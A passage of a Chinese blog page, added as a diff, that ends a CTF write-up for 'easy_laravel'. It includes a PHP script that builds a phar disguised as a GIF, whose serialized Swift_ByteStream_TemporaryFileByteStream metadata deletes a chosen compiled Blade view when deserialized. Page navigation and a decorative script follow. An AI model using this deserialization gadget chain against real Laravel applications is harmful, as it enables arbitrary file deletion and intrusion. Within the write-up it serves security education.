class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="keyword">$this</span>-&gt;getPath())) &#123;</span><br><span class="line">            @unlink(<span class="keyword">$this</span>-&gt;getPath());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以发现正是想要的文件删除，这里遇到一个问题，编译后文件的文件名不知道，这里跟入 <code>Illuminate/View/Compilers/Compiler.php</code> </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Get the path to the compiled version of a view.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  string  $path</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCompiledPath</span>(<span class="params"><span class="variable">$path</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;cachePath.<span class="string">&#x27;/&#x27;</span>.sha1(<span class="variable">$path</span>).<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以发现其实是基于路径的 sha1 值，但是服务器上的路径在哪儿呢，在使用管理员身份登录后，可以看到一条note </p>
+<p><img src="/images/20181014093727.png"></p>
+<p>使用了nginx的默认配置，那么flag文件的完整路径就是 <code>/usr/share/nginx/html/resources/views/auth/flag.blade.php</code>，经过sha1后得到 34e41df0934a75437873264cd28e2d835bc38772.php</p>
+<p>写一个payload生成phar文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$filepath</span> = <span class="string">&#x27;/usr/share/nginx/html/resources/views/auth/flag.blade.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">require</span> <span class="string">&#x27;/usr/share/nginx/html/vendor/autoload.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$obj</span> = <span class="keyword">new</span> Swift_ByteStream_TemporaryFileByteStream();</span><br><span class="line">    <span class="variable">$a</span> = serialize(<span class="variable">$obj</span>);</span><br><span class="line">    <span class="variable">$a</span> = preg_replace(<span class="string">&#x27;/\/tmp\/FileByteStream[a-zA-Z0-9]&#123;6&#125;/&#x27;</span>, sha1(xxx), <span class="variable">$a</span>);</span><br><span class="line">    <span class="variable">$a</span> = str_replace(<span class="string">&#x27;25&#x27;</span>, <span class="string">&#x27;90&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line">    <span class="variable">$b</span> = unserialize(<span class="variable">$a</span>);</span><br><span class="line">    <span class="variable">$p</span> = <span class="keyword">new</span> Phar(<span class="string">&#x27;./1.phar&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$p</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$p</span>-&gt;setStub(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line">    <span class="variable">$p</span>-&gt;setMetadata(<span class="variable">$b</span>);</span><br><span class="line">    <span class="variable">$p</span>-&gt;addFromString(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;text&#x27;</span>);</span><br><span class="line">    <span class="variable">$p</span>-&gt;stopBuffering();</span><br><span class="line">    rename(<span class="string">&#x27;./1.phar&#x27;</span>, <span class="string">&#x27;1.gif&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后上传1.gif，check的时候传入自定义的path和filename，然后访问/flag ，得到flag</p>
+<p><img src="/images/20181014093640.png"></p>
+<p><img src="/images/20181014093657.png"></p>
+
+    </div>
+  </article>
+  <div class="toc-container">
+    
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">Posts</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-laravel"><span class="toc-text">easy_laravel</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-text">这也是使用 Laravel 5.4的原因，在高于5.4的版本中，重置密码这个 token 会被 bcrypt 再存入，就和用户密码一样</span></a></li></ol></li></ol></li></ol></li></ol>
+  </div>
+
+
+  </div>
+</div>
+<div class="copyright">
+    <span>本作品采用</span>
+    <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+<div class="share" style="width: 100%;">
+  <div style="margin: auto; text-align: center; font-size: 0.8em; color: grey;">
+    <div class="social-share" data-initialized="true">
+      <a href="#" class="social-share-icon icon-weibo"></a>
+      <a href="#" class="social-share-icon icon-qq"></a>
+      <a href="#" class="social-share-icon icon-wechat"></a>
+      <a href="#" class="social-share-icon icon-qzone"></a>
+    </div>
+  </div>
+</div>
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2018/09/11/CSAW-CTF-2018-WTF-SQL-writeup/" rel="next" title="CSAW CTF 2018 WTF.SQL writeup">
+          CSAW CTF 2018 WTF.SQL writeup
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+          <a href="/2018/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA%E7%AC%94%E8%AE%B0/" rel="prev" title="栈溢出笔记">
+            栈溢出笔记
+          </a>
+          <span>〉</span>
+        
+      </div>
+    </div>
+  
+
+
+    </div>
+
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <a class="bottom-item" href="https://qvq.im">Index</a> |
+        <a class="bottom-item" href="https://github.com/sco4x0" target="_blank">GitHub</a> |
+        <a class="bottom-item" href="https://hexo.io" target="_blank">Powered by hexo</a> |
+        <a class="bottom-item" href="https://github.com/KevinOfNeu/hexo-theme-xoxo" target="_blank">Theme xoxo</a>
+    </div>
+</footer>
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+
+
+
+</body>
+</html>
